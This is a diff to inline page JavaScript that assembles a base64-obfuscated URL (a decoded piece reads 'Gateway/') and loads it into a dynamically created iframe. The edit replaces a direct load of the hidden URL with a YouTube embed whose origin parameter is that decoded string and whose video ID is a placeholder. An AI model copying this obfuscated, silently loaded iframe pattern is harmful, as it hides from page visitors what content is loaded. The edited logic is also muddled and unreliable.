@@ -18,14 +18,22 @@
         var e = "R2F0ZXdheS8=";
         
         var f = a + b + c + d + e;
-        
-        var g = document.createElement('iframe');
-        
+
+        // Decode the base64 string
         var h = atob(f);
-        
-        g.src = h;
+
+        // Create iframe element
+        var g = document.createElement('iframe');
+
+        // Use the correct YouTube embed URL for cross-origin handling
+        var videoId = 'YOUR_VIDEO_ID_HERE'; // Replace with actual YouTube video ID
+        var youtubeEmbedUrl = `https://www.youtube.com/embed/${videoId}?enablejsapi=1&origin=${h}`;
+
+        g.src = youtubeEmbedUrl;
         g.allowFullscreen = true;
-        g.allow = "fullscreen";
+        g.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen";
+        
+        // Append the iframe to the document body
         document.body.appendChild(g);
       });
     </script>
